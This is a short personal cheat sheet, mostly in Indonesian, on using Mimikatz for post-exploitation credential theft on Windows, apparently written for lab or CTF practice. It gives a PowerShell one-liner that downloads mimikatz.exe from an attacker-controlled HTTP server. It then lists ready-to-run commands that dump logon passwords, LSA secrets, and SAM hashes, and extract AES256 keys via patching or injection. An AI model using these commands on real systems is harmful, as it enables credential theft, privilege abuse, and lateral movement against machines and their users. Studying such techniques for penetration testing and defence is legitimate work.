https://www.offsec.com/metasploit-unleashed/mimikatz/

Extract credential from memory windows, sebenarnya lebih mudah paket `impacket-secretsdump` tapi tools itu lagi ada bug 🐞.
Tools untuk post-exploitation, artinya tools ini bisa bekerja kalau kita punya akun admin


# Upload
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.236:8088/mimikatz.exe', 'mimikatz.exe')"
```

# First thing to do
extra semua password yang pernah login
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
![](Attachments/Pasted%20image%2020260814111416.png)

Local LSA Secrets
```powershell
mimikatz.exe "privilege::debug" "lsadump::secrets" exit
```
![](Attachments/Pasted%20image%2020260817205426.png)

Dump seluruh SAM/LSA secret via teknik _patching_ (INI YANG BAGUS)
```powershell
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
```
![](Attachments/Pasted%20image%2020260817203230.png)

Dump AES256 (INI paling penting)
```powershell
mimikatz.exe "privilege::debug" "lsadump::lsa /inject" "exit"
```
![](Attachments/Pasted%20image%2020260818095625.png)